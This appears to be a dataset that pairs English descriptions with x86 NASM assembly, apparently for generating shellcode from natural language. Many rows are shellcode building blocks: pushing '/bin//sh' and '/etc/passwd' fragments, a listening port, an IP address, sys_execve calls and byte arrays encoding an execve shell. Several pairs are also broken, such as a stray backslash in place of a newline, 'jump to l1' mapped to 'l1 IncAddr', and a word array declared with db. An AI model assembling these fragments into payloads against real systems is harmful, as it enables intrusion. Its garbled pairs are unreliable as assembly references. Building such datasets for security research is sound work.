push double word 0x2f2f2f2f and the double word 0x7273752f onto the stack and point the edx register to the stack register,push double word var0 and double word var1 stack and point var2 register stack register,"push dword 0x2f2f2f2f \n push dword 0x7273752f \n mov edx , esp","push dword var0 \n push dword var1 \n mov var2 , esp"
push the dword 0x2f2f6e69 onto the stack,push dword var0 stack,push dword 0x2f2f6e69,push dword var0
push the doubleword 0x2f2f6e69 to the stack,push doubleword var0 stack,push dword 0x2f2f6e69,push dword var0
push the double word 0x2f3a2f3a onto the stack,push double word var0 stack,push dword 0x2f3a2f3a,push dword var0
push the dword 0x2f3a3a30 onto the stack,push dword var0 stack,push dword 0x2f3a3a30,push dword var0
push the double word 0x2f6e6962 onto the stack,push double word var0 stack,push dword 0x2f6e6962,push dword var0
push the double word 0x303a3a31 onto the stack,push double word var0 stack,push dword 0x303a3a31,push dword var0
push the double word 0x313a303a onto the stack,push double word var0 stack,push dword 0x313a303a,push dword var0
push double word 0x39396e2d onto the stack and point the ebp register to the stack register,push double word var0 stack and point var1 register stack register,"push dword 0x39396e2d \n mov ebp , esp","push dword var0 \n mov var1 , esp"
push double word 0x39396e2d onto the stack and point the ebx register to the stack register,push double word var0 stack and point var1 register stack register,"push dword 0x39396e2d \n mov ebx , esp","push dword var0 \n mov var1 , esp"
push double word 0x39396e2d onto the stack and point the edi register to the stack register,push double word var0 stack and point var1 register stack register,"push dword 0x39396e2d \n mov edi , esp","push dword var0 \n mov var1 , esp"
push double word 0x39396e2d onto the stack and point the esi register to the stack register,push double word var0 stack and point var1 register stack register,"push dword 0x39396e2d \n mov esi , esp","push dword var0 \n mov var1 , esp"
push the dword 0x3a303a3a onto the stack,push dword var0 stack,push dword 0x3a303a3a,push dword var0
push the doubleword 0x4227a28b onto the stack,push doubleword var0 stack,push dword 0x4227a28b,push dword var0
push the dword 0x45525649 onto the stack,push dword var0 stack,push dword 0x45525649,push dword var0
push the dword 0x58494741 onto the stack,push dword var0 stack,push dword 0x58494741,push dword var0
push the dword 0x5f657a69 onto the stack,push dword var0 stack,push dword 0x5f657a69,push dword var0
push the dword 0x6164732f onto the stack,push dword var0 stack,push dword 0x6164732f,push dword var0
push the dword 0x61702f2f onto the stack,push dword var0 stack,push dword 0x61702f2f,push dword var0
push the dword 0x61702f63 onto the stack,push dword var0 stack,push dword 0x61702f63,push dword var0
push the dword 0x61722f6c onto the stack,push dword var0 stack,push dword 0x61722f6c,push dword var0
push the doubleword 0x61747069 to the stack,push doubleword var0 stack,push dword 0x61747069,push dword var0
push the dword 0x61747069 onto the stack,push dword var0 stack,push dword 0x61747069,push dword var0
push the dword 0x62732f2f onto the stack,push dword var0 stack,push dword 0x62732f2f,push dword var0
push the doubleword 0x62732f2f to the stack,push doubleword var0 stack,push dword 0x62732f2f,push dword var0
push the doubleword 0x62732f2f onto the stack and point the ebx register to the stack register,push doubleword var0 stack and point var1 register stack register,"push dword 0x62732f2f \n mov ebx , esp","push dword var0 \n mov var1 , esp"
push the dword 0x6374652f onto the stack,push dword var0 stack,push dword 0x6374652f,push dword var0
push the dword 0x64616568 onto the stack,push dword var0 stack,push dword 0x64616568,push dword var0
push the dword 0x64777373 onto the stack,push dword var0 stack,push dword 0x64777373,push dword var0
push the dword 0x656e7265 onto the stack,push dword var0 stack,push dword 0x656e7265,push dword var0
push the dword 0x68732f2f onto the stack,push dword var0 stack,push dword 0x68732f2f,push dword var0
push the dword 0x68732f63 onto the stack,push dword var0 stack,push dword 0x68732f63,push dword var0
push the dword 0x68732f6e onto the stack,push dword var0 stack,push dword 0x68732f6e,push dword var0
push the dword 0x69622f2f onto the stack,push dword var0 stack,push dword 0x69622f2f,push dword var0
push the dword 0x69622f3a onto the stack,push dword var0 stack,push dword 0x69622f3a,push dword var0
push the dword 0x6962732f onto the stack,push dword var0 stack,push dword 0x6962732f,push dword var0
push the dword 0x6b2f7379 onto the stack,push dword var0 stack,push dword 0x6b2f7379,push dword var0
push the dword 0x6b6e756a onto the stack,push dword var0 stack,push dword 0x6b6e756a,push dword var0
push the dword 0x6d6f646e onto the stack,push dword var0 stack,push dword 0x6d6f646e,push dword var0
push the dword 0x6e69622f onto the stack,push dword var0 stack,push dword 0x6e69622f,push dword var0
push the dword 0x6e69922f onto the stack,push dword var0 stack,push dword 0x6e69922f,push dword var0
push the dword 0x6f702f6e onto the stack,push dword var0 stack,push dword 0x6f702f6e,push dword var0
push the dword 0x6f726577 onto the stack,push dword var0 stack,push dword 0x6f726577,push dword var0
push the dword 0x7264632f onto the stack,push dword var0 stack,push dword 0x7264632f,push dword var0
push the dword 0x72657355 onto the stack,push dword var0 stack,push dword 0x72657355,push dword var0
push the dword 0x732f636f onto the stack,push dword var0 stack,push dword 0x732f636f,push dword var0
push the doubleword 0x73656c62 to the stack,push doubleword var0 stack,push dword 0x73656c62,push dword var0
push the dword 0x73656c62 onto the stack,push dword var0 stack,push dword 0x73656c62,push dword var0
push the dword 0x7461632f onto the stack,push dword var0 stack,push dword 0x7461632f,push dword var0
push the dword 0x74652f2f onto the stack,push dword var0 stack,push dword 0x74652f2f,push dword var0
push double word 0x74652f2f onto the stack and point the eax register to the stack register,push double word var0 stack and point var1 register stack register,"push dword 0x74652f2f \n mov eax , esp","push dword var0 \n mov var1 , esp"
push double word 0x74652f2f onto the stack and point the ebp register to the stack register,push double word var0 stack and point var1 register stack register,"push dword 0x74652f2f \n mov ebp , esp","push dword var0 \n mov var1 , esp"
push double word 0x74652f2f onto the stack and point the ebx register to the stack register,push double word var0 stack and point var1 register stack register,"push dword 0x74652f2f \n mov ebx , esp","push dword var0 \n mov var1 , esp"
push double word 0x74652f2f onto the stack and point the ecx register to the stack register,push double word var0 stack and point var1 register stack register,"push dword 0x74652f2f \n mov ecx , esp","push dword var0 \n mov var1 , esp"
push double word 0x74652f2f onto the stack and point the edx register to the stack register,push double word var0 stack and point var1 register stack register,"push dword 0x74652f2f \n mov edx , esp","push dword var0 \n mov var1 , esp"
push double word 0x74652f2f onto the stack and point the esi register to the stack register,push double word var0 stack and point var1 register stack register,"push dword 0x74652f2f \n mov esi , esp","push dword var0 \n mov var1 , esp"
push the dword 0x7665642f onto the stack,push dword var0 stack,push dword 0x7665642f,push dword var0
push the dword 0x776f6461 onto the stack,push dword var0 stack,push dword 0x776f6461,push dword var0
push the doubleword 0x8140a8c0 to the stack,push doubleword var0 stack,push dword 0x8140a8c0,push dword var0
push the doubleword eax to the stack,push doubleword var0 stack,push dword eax,push dword var0
push the dword eax onto the stack,push dword var0 stack,push dword eax,push dword var0
push the doubleword ebx to the stack,push doubleword var0 stack,push dword ebx,push dword var0
push dx onto the stack,push var0 stack,push dx,push var0
preserve eax on the stack,preserve var0 stack,push eax,push var0
push eax onto the stack,push var0 stack,push eax,push var0
push eax to the stack,push var0 stack,push eax,push var0
push eax value to the stack,push var0 value stack,push eax,push var0
push the contents of eax onto the stack,push contents var0 stack,push eax,push var0
push the contents of eax register onto the stack,push contents var0 register stack,push eax,push var0
push the contents of the eax register onto the stack,push contents var0 register stack,push eax,push var0
push eax onto stack,push var0 stack,push eax,push var0
push eax on the stack,push var0 stack,push eax,push var0
push the value of register eax onto the stack,push value register var0 stack,push eax,push var0
push the contents of the eax register onto the stack and point ebx to the stack register,push contents var0 register stack and point var1 stack register,"push eax \n mov ebx , esp","push var0 \n mov var1 , esp"
push the contents of the eax register onto the stack and point ecx to the stack register,push contents var0 register stack and point var1 stack register,"push eax \n mov ecx , esp","push var0 \n mov var1 , esp"
push the contents of the eax register onto the stack and point edx to the stack register,push contents var0 register stack and point var1 stack register,"push eax \n mov edx , esp","push var0 \n mov var1 , esp"
save old base pointer,save old base pointer,push ebp,push ebp
save the old base pointer value,save old base pointer value,push ebp,push ebp
push the contents of the ebp register onto the stack,push contents var0 register stack,push ebp,push var0
push the ebp onto the stack,push var0 stack,push ebp,push var0
push ebp onto the stack,push var0 stack,push ebp,push var0
preserve ebx on the stack,preserve var0 stack,push ebx,push var0
push the contents of ebx register onto the stack,push contents var0 register stack,push ebx,push var0
push the contents of the ebx register onto the stack,push contents var0 register stack,push ebx,push var0
push the ebx value to the stack,push var0 value stack,push ebx,push var0
push ebx onto the stack,push var0 stack,push ebx,push var0
push the contents of ebx onto the stack,push contents var0 stack,push ebx,push var0
push ebx on the stack,push var0 stack,push ebx,push var0
push ebx to the stack,push var0 stack,push ebx,push var0
push the contents of the ebx register onto the stack and point eax to the stack register,push contents var0 register stack and point var1 stack register,"push ebx \n mov eax , esp","push var0 \n mov var1 , esp"
push the contents of the ebx register onto the stack and point ecx to the stack register,push contents var0 register stack and point var1 stack register,"push ebx \n mov ecx , esp","push var0 \n mov var1 , esp"
push the contents of the ebx register onto the stack and point edx to the stack register,push contents var0 register stack and point var1 stack register,"push ebx \n mov edx , esp","push var0 \n mov var1 , esp"
preserve ecx on the stack,preserve var0 stack,push ecx,push var0
push the contents of the ecx register onto the stack,push contents var0 register stack,push ecx,push var0
push the value of register ecx onto the stack,push value register var0 stack,push ecx,push var0
push ecx onto the stack,push var0 stack,push ecx,push var0
push the contents of ecx register onto the stack,push contents var0 register stack,push ecx,push var0
push the ecx onto the stack,push var0 stack,push ecx,push var0
push ecx on the stack,push var0 stack,push ecx,push var0
push ecx to the stack,push var0 stack,push ecx,push var0
push the contents of the ecx register onto the stack.,push contents var0 register stack.,push ecx,push var0
push the edi onto the stack,push var0 stack,push edi,push var0
push edi to the stack,push var0 stack,push edi,push var0
push the contents of the edi register onto the stack,push contents var0 register stack,push edi,push var0
push edi onto the stack,push var0 stack,push edi,push var0
push the contents of edi register onto the stack,push contents var0 register stack,push edi,push var0
push the contents of the edi register onto the stack and point eax to the stack register,push contents var0 register stack and point var1 stack register,"push edi \n mov eax , esp","push var0 \n mov var1 , esp"
push the contents of the edi register onto the stack and point ebx to the stack register,push contents var0 register stack and point var1 stack register,"push edi \n mov ebx , esp","push var0 \n mov var1 , esp"
push the contents of the edi register onto the stack and point ecx to the stack register,push contents var0 register stack and point var1 stack register,"push edi \n mov ecx , esp","push var0 \n mov var1 , esp"
push the contents of the edi register onto the stack and point edx to the stack register,push contents var0 register stack and point var1 stack register,"push edi \n mov edx , esp","push var0 \n mov var1 , esp"
preserve edx on the stack,preserve var0 stack,push edx,push var0
push edx to the stack,push var0 stack,push edx,push var0
push the contents of edx register onto the stack,push contents var0 register stack,push edx,push var0
push the contents of the edx register onto the stack,push contents var0 register stack,push edx,push var0
push the value of register edx onto the stack,push value register var0 stack,push edx,push var0
push edx onto the stack,push var0 stack,push edx,push var0
push edx on the stack,push var0 stack,push edx,push var0
push the contents of the edx register onto the stack and point eax to the stack register,push contents var0 register stack and point var1 stack register,"push edx \n mov eax , esp","push var0 \n mov var1 , esp"
push the contents of the edx register onto the stack and point ebx to the stack register,push contents var0 register stack and point var1 stack register,"push edx \n mov ebx , esp","push var0 \n mov var1 , esp"
push the contents of the edx register onto the stack and point ecx to the stack register,push contents var0 register stack and point var1 stack register,"push edx \n mov ecx , esp","push var0 \n mov var1 , esp"
preserve esi on the stack,preserve var0 stack,push esi,push var0
push the contents of the esi register onto the stack,push contents var0 register stack,push esi,push var0
push the contents of the esi register onto the stack.,push contents var0 register stack.,push esi,push var0
push the esi onto the stack,push var0 stack,push esi,push var0
push esi onto the stack,push var0 stack,push esi,push var0
push the contents of esi register onto the stack,push contents var0 register stack,push esi,push var0
push esi on the stack,push var0 stack,push esi,push var0
push the contents of the esi register onto the stack and point eax to the stack register,push contents var0 register stack and point var1 stack register,"push esi \n mov eax , esp","push var0 \n mov var1 , esp"
push the contents of the esi register onto the stack and point ebx to the stack register,push contents var0 register stack and point var1 stack register,"push esi \n mov ebx , esp","push var0 \n mov var1 , esp"
push the contents of the esi register onto the stack and point edx to the stack register,push contents var0 register stack and point var1 stack register,"push esi \n mov edx , esp","push var0 \n mov var1 , esp"
push the contents of esp register onto the stack,push contents esp register stack,push esp,push esp
push the contents of the esp register onto the stack,push contents esp register stack,push esp,push esp
push the esp onto the stack,push esp stack,push esp,push esp
push esp to the stack,push esp stack,push esp,push esp
push esp onto the stack,push esp stack,push esp,push esp
push len onto the stack,push var0 stack,push len,push var0
move /bin/sh into the eax register,var0 var1 register,"push long 0x68732f2f \n push long 0x6e69622f \n mov eax , esp","push long 0x68732f2f \n push long 0x6e69622f \n mov var1 , esp"
move /bin/sh into the ebx register,var0 var1 register,"push long 0x68732f2f \n push long 0x6e69622f \n mov ebx , esp","push long 0x68732f2f \n push long 0x6e69622f \n mov var1 , esp"
put /bin/sh into the ecx register,var0 var1 register,"push long 0x68732f2f \n push long 0x6e69622f \n mov ecx , esp","push long 0x68732f2f \n push long 0x6e69622f \n mov var1 , esp"
put /bin/sh into the edx register,var0 var1 register,"push long 0x68732f2f \n push long 0x6e69622f \n mov edx , esp","push long 0x68732f2f \n push long 0x6e69622f \n mov var1 , esp"
push name onto the stack,push name stack,push name,push name
push address of string print_msg,push address string var0,push offset printf_msg,push offset printf_msg
push the contents in ogin onto the stack,push contents var0 stack,push ogin,push var0
push sock_reg onto the stack,push var0 stack,push sock_reg,push var0
push the sock_reg onto the stack,push var0 stack,push sock_reg,push var0
push sys_execve onto the stack,push var0 stack,push sys_execve,push var0
push the word [edx] onto the stack,push the word [edx] onto the stack,push word [edx],push word [edx]
push the word [edx] to the stack,push the word [edx] to the stack,push word [edx],push word [edx]
push the word 0544o onto the stack,push word var0 stack,push word 0544o,push word var0
push the word 0644o onto the stack,push word var0 stack,push word 0644o,push word var0
push the word 0666q onto the stack,push word var0 stack,push word 0666q,push word var0
push the word 0x02 onto the stack,push word var0 stack,push word 0x02,push word var0
push the word 0x0a onto the stack,push word var0 stack,push word 0x0a,push word var0
push the word 0x0a to the stack,push word var0 stack,push word 0x0a,push word var0
push the word 0x0f27 onto the stack,push word var0 stack,push word 0x0f27,push word var0
push the word 0x1b6 to the stack,push word var0 stack,push word 0x1b6,push word var0
push the word 0x1b6 onto the stack,push word var0 stack,push word 0x1b6,push word var0
push the word 0x1ff onto the stack,push word var0 stack,push word 0x1ff,push word var0
push the word 0x2 onto the stack,push word var0 stack,push word 0x2,push word var0
push the word 0x2 to the stack,push word var0 stack,push word 0x2,push word var0
push 0x2923 onto stack port,push var0 stack port,push word 0x2923,push word var0
push the word 0x2e2e onto the stack,push word var0 stack,push word 0x2e2e,push word var0
push the word 0x3436 onto the stack,push word var0 stack,push word 0x3436,push word var0
push the word 0x3582 onto the stack,push word var0 stack,push word 0x3582,push word var0
push the word 0x3636 onto the stack,push word var0 stack,push word 0x3636,push word var0
push the word 0x3905 to the stack,push word var0 stack,push word 0x3905,push word var0
push the word 0x3905 onto the stack,push word var0 stack,push word 0x3905,push word var0
push the word 0x3930 onto the stack,push word var0 stack,push word 0x3930,push word var0
push the word 0x401f onto the stack,push word var0 stack,push word 0x401f,push word var0
push the word 0x4255 onto the stack,push word var0 stack,push word 0x4255,push word var0
push the word 0x462d to the stack,push word var0 stack,push word 0x462d,push word var0
push the word 0x462d onto the stack,push word var0 stack,push word 0x462d,push word var0
push 0x5000 onto stack port,push var0 stack port,push word 0x5000,push word var0
push the word 0x5445 onto the stack,push word var0 stack,push word 0x5445,push word var0
push the word 0x5974 onto the stack,push word var0 stack,push word 0x5974,push word var0
push the word 0x5c11 onto the stack,push word var0 stack,push word 0x5c11,push word var0
push the word 0x5c11 to the stack,push word var0 stack,push word 0x5c11,push word var0
push the word 0x632d onto the stack,push word var0 stack,push word 0x632d,push word var0
push the word 0x632d to the stack,push word var0 stack,push word 0x632d,push word var0
push the word 0x632d onto the stack and point the eax register to the stack register,push word var0 stack and point var1 register stack register,"push word 0x632d \n mov eax , esp","push word var0 \n mov var1 , esp"
push the word 0x632d onto the stack and point the ebx register to the stack register,push word var0 stack and point var1 register stack register,"push word 0x632d \n mov ebx , esp","push word var0 \n mov var1 , esp"
push the word 0x632d onto the stack and point the ecx register to the stack register,push word var0 stack and point var1 register stack register,"push word 0x632d \n mov ecx , esp","push word var0 \n mov var1 , esp"
push the word 0x632d onto the stack and point the edi register to the stack register,push word var0 stack and point var1 register stack register,"push word 0x632d \n mov edi , esp","push word var0 \n mov var1 , esp"
push the word 0x632d onto the stack and point the edx register to the stack register,push word var0 stack and point var1 register stack register,"push word 0x632d \n mov edx , esp","push word var0 \n mov var1 , esp"
push the word 0x632d onto the stack and point the esi register to the stack register,push word var0 stack and point var1 register stack register,"push word 0x632d \n mov esi , esp","push word var0 \n mov var1 , esp"
push the word 0x6465 onto the stack,push word var0 stack,push word 0x6465,push word var0
push the word 0x662d onto the stack,push word var0 stack,push word 0x662d,push word var0
push the word 0x662d onto the stack and point the eax register to the stack register,push word var0 stack and point var1 register stack register,"push word 0x662d \n mov eax , esp","push word var0 \n mov var1 , esp"
push the word 0x662d onto the stack and point the ebx register to the stack register,push word var0 stack and point var1 register stack register,"push word 0x662d \n mov ebx , esp","push word var0 \n mov var1 , esp"
push the word 0x662d onto the stack and point the ecx register to the stack register,push word var0 stack and point var1 register stack register,"push word 0x662d \n mov ecx , esp","push word var0 \n mov var1 , esp"
push the word 0x662d onto the stack and point the edi register to the stack register,push word var0 stack and point var1 register stack register,"push word 0x662d \n mov edi , esp","push word var0 \n mov var1 , esp"
push the word 0x662d onto the stack and point the edx register to the stack register,push word var0 stack and point var1 register stack register,"push word 0x662d \n mov edx , esp","push word var0 \n mov var1 , esp"
push the word 0x662d onto the stack and point the esi register to the stack register,push word var0 stack and point var1 register stack register,"push word 0x662d \n mov esi , esp","push word var0 \n mov var1 , esp"
push the word 0x6666 onto the stack,push word var0 stack,push word 0x6666,push word var0
push the word 0x6873 onto the stack,push word var0 stack,push word 0x6873,push word var0
push the word 0x692d onto the stack,push word var0 stack,push word 0x692d,push word var0
push the word 0x697a onto the stack,push word var0 stack,push word 0x697a,push word var0
push the word 0x6d6f onto the stack,push word var0 stack,push word 0x6d6f,push word var0
push the word 0x6f64 to the stack,push word var0 stack,push word 0x6f64,push word var0
push the word 0x6f64 onto the stack,push word var0 stack,push word 0x6f64,push word var0
push the word 0x7065 onto the stack,push word var0 stack,push word 0x7065,push word var0
push the word 0x722d onto the stack,push word var0 stack,push word 0x722d,push word var0
push the word 0x7365 onto the stack,push word var0 stack,push word 0x7365,push word var0
push the word 0x736e onto the stack,push word var0 stack,push word 0x736e,push word var0
push the word 0x776f onto the stack,push word var0 stack,push word 0x776f,push word var0
push the word 0x7773 to the stack,push word var0 stack,push word 0x7773,push word var0
push the word 0x7773 onto the stack,push word var0 stack,push word 0x7773,push word var0
push the word 0x8223 onto the stack,push word var0 stack,push word 0x8223,push word var0
push the word 0xaaaa onto the stack,push word var0 stack,push word 0xaaaa,push word var0
push the word 0xb315 onto the stack,push word var0 stack,push word 0xb315,push word var0
push the word 0xc005 onto the stack,push word var0 stack,push word 0xc005,push word var0
push the word 0xc005 to the stack,push word var0 stack,push word 0xc005,push word var0
push the word 0xffff onto the stack,push word var0 stack,push word 0xffff,push word var0
push the word 0xffff to the stack,push word var0 stack,push word 0xffff,push word var0
push the word 1 onto the stack and point eax to the stack register,push word 1 stack and point var0 stack register,"push word 1 \n mov eax , esp","push word 1 \n mov var0 , esp"
push the word 10 to the stack,push word 10 stack,push word 10,push word 10
push the word 100 onto the stack,push word 100 stack,push word 100,push word 100
push the word 17 onto the stack and point edx to the stack register,push word 17 stack and point var0 stack register,"push word 17 \n mov edx , esp","push word 17 \n mov var0 , esp"
push 2 onto stack,push 2 stack,push word 2,push word 2
push the word 2 onto the stack,push word 2 stack,push word 2,push word 2
push the word 2 onto the stack and point ecx to the stack register,push word 2 stack and point var0 stack register,"push word 2 \n mov ecx , esp","push word 2 \n mov var0 , esp"
push the word 21 onto the stack and point ebx to the stack register,push word 21 stack and point var0 stack register,"push word 21 \n mov ebx , esp","push word 21 \n mov var0 , esp"
push the word ax onto the stack,push word ax stack,push word ax,push word ax
push the word bx onto the stack,push word var0 stack,push word bx,push word var0
push the word bx to the stack,push word var0 stack,push word bx,push word var0
push the word cx onto the stack,push word cx stack,push word cx,push word cx
push the zero_reg onto the stack,push var0 stack,push zero_reg,push var0
push zero_reg onto the stack,push var0 stack,push zero_reg,push var0
declare push_cmd label,declare var0 label,push_cmd :,var0 :
declare the push_cmd label,declare var0 label,push_cmd :,var0 :
push $0x68732f2f onto the stack,push var0 stack,pushl $0x68732f2f,pushl var0
push $0x6e69622f onto the stack,push var0 stack,pushl $0x6e69622f,pushl var0
push $0x632d onto the stack,push var0 stack,pushw $0x632d,pushw var0
push the 0x3905 onto the stack,push var0 stack,pushw 0x3905,pushw var0
push the 0x682d onto the stack,push var0 stack,pushw 0x682d,pushw var0
push the 0x697a onto the stack,push var0 stack,pushw 0x697a,pushw var0
in the routine R1 point to the next byte in esi,in routine var0 point next byte var1,R1 : \n inc esi,var0 : \n inc var1
in the routine R1 point to the next word in esi,in routine var0 point next word var1,R1 : \n inc esi \n inc esi,var0 : \n inc var1 \n inc var1
in the routine R1 save the shellcode in esi,in routine var0 save shellcode var1,R1 : \n pop esi,var0 : \n pop var1
declare R2 and point to the next byte in esi,declare var0 and point next byte var1,R2 : \n inc esi,var0 : \n inc var1
declare R2 and point to the next word in esi,declare var0 and point next word var1,R2 : \n inc esi \n inc esi,var0 : \n inc var1 \n inc var1
define label re,define label re,re,re
declare the read label,declare read label,read :,read :
declare the reading label,declare reading label,reading :,reading :
define the doubleword variable real_number1 and initialize to 1234,define doubleword variable var0 and initialize 1234,real_number1 dd 1234,var0 dd 1234
define the doubleword variable real_number2 and initialize 123456,define doubleword variable var0 and initialize 123456,real_number2 dd 123456,var0 dd 123456
reserve an array of ten reals for realarray,reserve array ten reals var0 var1,realarray resq 10,var1 resq 10
reserve array realarray of 10 real numbers,reserve array var0 10 real numbers,realarray resq 10,var0 resq 10
return,return,ret,ret
return the address off the stack and returns control to that location,return address off stack and returns control var0 location,ret,ret
return to our program,return our program,ret,ret
return to the address on the top of the stack,return address top stack,ret,ret
return to where the function was called,return var0 function was called,ret,ret
return to caller,return caller,ret,ret
left rotate the byte at the address esi by 0x2 bits,left rotate byte address var0 var1 bits,"rol byte [esi] , 0x2","rol byte [var0] , var1"
left rotate the byte in esi 2 times,left rotate byte var0 2 times,"rol byte [esi] , 0x2","rol byte [var0] , 0x2"
rotate 4 bits left the byte starting at the address esi,rotate 4 bits left byte starting address var0,"rol byte [esi] , 4","rol byte [var0] , 4"
left rotate the contents of the edi register by 1 bit,left rotate contents var0 register 1 bit,"rol edi , 1","rol var0 , 1"
left rotate the edi register 1 time,left rotate var0 register 1 time,"rol edi , 1","rol var0 , 1"
left rotate the contents of the edx register by 0x4 bits,left rotate contents var0 register var1 bits,"rol edx , 0x4","rol var0 , var1"
right rotate the contents of the esi register by 1 bit,right rotate contents var0 register 1 bit,"ror esi , 1","ror var0 , 1"
declare the rotate label,declare rotate label,rotate :,rotate :
"S1 is an array of bytes 0xc0, 0x31, 0x68, 0x50, 0x2f, 0x2f, 0x68, 0x73",var0 array bytes var1,"S1 : db 0xc0 , 0x31 , 0x68 , 0x50 , 0x2f , 0x2f , 0x68 , 0x73 , 0x2f , 0x68 , 0x69 , 0x62 , 0x87 , 0x6e , 0xb0 , 0xe3 , 0xcd , 0x0b , 0x90 , 0x80","var0 : db var1 , 0x2f , 0x68 , 0x69 , 0x62 , 0x87 , 0x6e , 0xb0 , 0xe3 , 0xcd , 0x0b , 0x90 , 0x80"
"define S2 as the array of bytes 0x2f, 0x68, 0x69, 0x62, 0x87, 0x6e, 0xb0, 0xe3, 0xcd, 0x0b, 0x90, 0x80",define var0 array bytes var1,"S2 : db 0x2f , 0x68 , 0x69 , 0x62 , 0x87 , 0x6e , 0xb0 , 0xe3 , 0xcd , 0x0b , 0x90 , 0x80",var0 : db var1
"S3 is an array of words 0xc0, 0x31, 0x68, 0x50, 0x2f, 0x2f, 0x68, 0x73",var0 array words var1,"S3 : dw 0xc0 , 0x31 , 0x68 , 0x50 , 0x2f , 0x2f , 0x68 , 0x73 , 0x2f , 0x68 , 0x69 , 0x62 , 0x87 , 0x6e , 0xb0 , 0xe3 , 0xcd , 0x0b , 0x90 , 0x80","var0 : dw var1 , 0x2f , 0x68 , 0x69 , 0x62 , 0x87 , 0x6e , 0xb0 , 0xe3 , 0xcd , 0x0b , 0x90 , 0x80"
"define S4 as the array of words 0x2f, 0x68, 0x69, 0x62, 0x87, 0x6e, 0xb0, 0xe3, 0xcd, 0x0b, 0x90, 0x80",define var0 array words var1,"S4 : db 0x2f , 0x68 , 0x69 , 0x62 , 0x87 , 0x6e , 0xb0 , 0xe3 , 0xcd , 0x0b , 0x90 , 0x80",var0 : db var1
right shift the contents of eax by 23 bits,right shift contents var0 23 bits,"sar eax , 23","sar var0 , 23"
right shift the contents of eax by 31 bits,right shift contents var0 31 bits,"sar eax , 31","sar var0 , 31"
right shift the contents of ebx by 31 bits,right shift contents var0 31 bits,"sar ebx , 31","sar var0 , 31"
right shift the value of register ecx by 2 bits,right shift value register var0 2 bits,"sar ecx , 2","sar var0 , 2"
right shift the value of register edx by 4 bits,right shift value register var0 4 bits,"sar edx , 4","sar var0 , 4"
compare eax with doubleword at edi and set status flags,compare var0 doubleword var1 and set status flags,scasd,scasd
compare the contents of the eax register with doubleword at edi and set status flags,compare contents var0 register doubleword var1 and set status flags,scasd,scasd
compare the value in eax to the doubleword addressed by edi,compare value var0 doubleword addressed var1,scasd,scasd
compare the value in the eax register to the doubleword addressed by the edi register,compare value var0 register doubleword addressed var1 register,scasd,scasd
jump to the _end label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register,jump var0 label if value var1 register not equal doubleword addressed var2 else jump var2 register,scasd \ jnz _end \n jmp edi,scasd \ jnz var0 \n jmp var2
jump to the _end label if the value in the eax register is not equal to the doubleword addressed by edi,jump var0 label if value var1 register not equal doubleword addressed var2,scasd \n jnz _end,scasd \n jnz var0
jump to the _end label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register,jump var0 label if value var1 register not equal doubleword addressed var2 else jump var2 register,scasd \n jnz _end \n jmp edi,scasd \n jnz var0 \n jmp var2
jump to the _start label if the value in the eax register is not equal to the doubleword addressed by edi,jump var0 label if value var1 register not equal doubleword addressed var2,scasd \n jnz _start,scasd \n jnz var0
jump to the _start label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register,jump var0 label if value var1 register not equal doubleword addressed var2 else jump var2 register,scasd \n jnz _start \n jmp edi,scasd \n jnz var0 \n jmp var2
jump to the IncAddr label if the value in the eax register is not equal to the doubleword addressed by edi,jump var0 label if value var1 register not equal doubleword addressed var2,scasd \n jnz IncAddr,scasd \n jnz var0
jump to the IncAddr label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register,jump var0 label if value var1 register not equal doubleword addressed var2 else jump var2 register,scasd \n jnz IncAddr \n jmp edi,scasd \n jnz var0 \n jmp var2
jump to the l1 label if the value in the eax register is not equal to the doubleword addressed by edi,jump var0 label if value var1 register not equal doubleword addressed var2,scasd \n l1 IncAddr,scasd \n var0 IncAddr
jump to the l1 label if the value in the eax register is not equal to the doubleword addressed by edi else jump to the edi register,jump var0 label if value var1 register not equal doubleword addressed var2 else jump var2 register,scasd \n l1 IncAddr \n jmp edi,scasd \n var0 IncAddr \n jmp var2
declare section containing uninitialized data,declare section containing var0 data,section . bss,section . bss
declare the bss section,declare bss section,section . bss,section . bss
section bss,section bss,section . bss,section . bss
declare section bss,declare section bss,section . bss,section . bss
declare bss section,declare bss section,section . bss,section . bss
declare code section .bss,declare code section .bss,section . bss,section . bss
declare section containing initialized data,declare section containing initialized data,section . data,section . data
declare the data section,declare data section,section . data,section . data
section data,section data,section . data,section . data
section for initialized data,section var0 initialized data,section . data,section . data
declare data section,declare data section,section . data,section . data
declare section .data,declare section .data,section . data,section . data
declare section containing code,declare section containing code,section . text,section . text
declare section text,declare section text,section . text,section . text
declare text section,declare text section,section . text,section . text
declare the text section,declare text section,section . text,section . text
section .text,section var0,section . text,section . text
declare .text section,declare var0 section,section . text,section . text
declare code section,declare code section,section . text,section . text
declare the set_argv label,declare var0 label,set_argv :,var0 :
define set_argv label,define var0 label,set_argv :,var0 :
define set_mark label,define var0 label,set_mark :,var0 :
declare the set_mark label,declare var0 label,set_mark :,var0 :
declare the setup label,declare setup label,setup :,setup :
declare the shell_ret label,declare var0 label,shell_ret :,var0 :
declare the shellcode label,declare shellcode label,shellcode :,shellcode :
define shellcodelen equal to the length shellcode,define var0 equal length shellcode,shellcodelen equ $-shellcode,var0 equ $-shellcode
declare the shift_decode label,declare var0 label,shift_decode :,var0 :
left shift the contents of al by 4 bit positions,left shift contents al 4 bit positions,"shl al , 4","shl al , 4"
left shift cx,left shift cx,"shl cx , 1","shl cx , 1"
multiply eax by 2 using left shift,multiply var0 2 using left shift,"shl eax , 1","shl var0 , 1"
left shift the contents of eax 16 bits,left shift contents var0 16 bits,"shl eax , 16","shl var0 , 16"
multiply eax by 4 using left shift,multiply var0 4 using left shift,"shl eax , 2","shl var0 , 2"
left shift the contents of eax by 5 bit positions,left shift contents var0 5 bit positions,"shl eax , 5","shl var0 , 5"
left shift eax by two bits,left shift var0 two bits,"shl eax , 2","shl var0 , 2"
multiply ebx by 2 using left shift,multiply var0 2 using left shift,"shl ebx , 1","shl var0 , 1"
multiply ebx by 4 using left shift,multiply var0 4 using left shift,"shl ebx , 2","shl var0 , 2"
multiply ecx by 2 using left shift,multiply var0 2 using left shift,"shl ecx , 1","shl var0 , 1"
multiply ecx by 4 using left shift,multiply var0 4 using left shift,"shl ecx , 2","shl var0 , 2"
left shift the contents of the edi register by 0x1 bit,left shift contents var0 register var1 bit,"shl edi , 0x1","shl var0 , var1"
